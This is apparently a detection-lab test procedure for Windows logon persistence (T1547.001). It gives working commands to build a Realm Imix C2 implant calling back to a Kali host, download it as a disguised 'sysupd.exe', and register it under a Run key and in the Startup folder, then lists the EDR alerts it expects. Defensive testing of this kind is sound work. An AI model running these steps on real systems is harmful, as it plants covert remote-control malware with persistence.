# Test: Persistence — registry Run key + Startup folder (T1547.001)

**Chain:** the two classic logon persistences — an autorun value and a Startup-folder
script. Tests the auditor's oldest two diffs.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).

(stage it on the victim first via any delivery walkthrough).

**Victim (elevated PowerShell):** `.\test.ps1`

```powershell
New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run `
  -Name CCDCTestPayload -Value "C:\Users\Public\sysupd.exe" -PropertyType String -Force
Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ccdc-test.bat" "@echo test"
```

**Expected alerts (each within one 30s audit cycle):**

| Rule | Sev | Trigger |
|---|---|---|
| `PERS-RUNKEY` | high | new autorun value vs baseline |
| `PERS-STARTUP` | high | new Startup-folder item |
| launch chain on next logon | high/crit | `EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH` when autorun fires |

**Optional full-chain:** sign out/in (or restart explorer) and watch the autorun execute
under the launch rules. Don't leave the value in place overnight.

**Cleanup:** global cleanup; manually:
`Remove-ItemProperty HKCU:\...\Run -Name CCDCTestPayload` + delete the .bat.
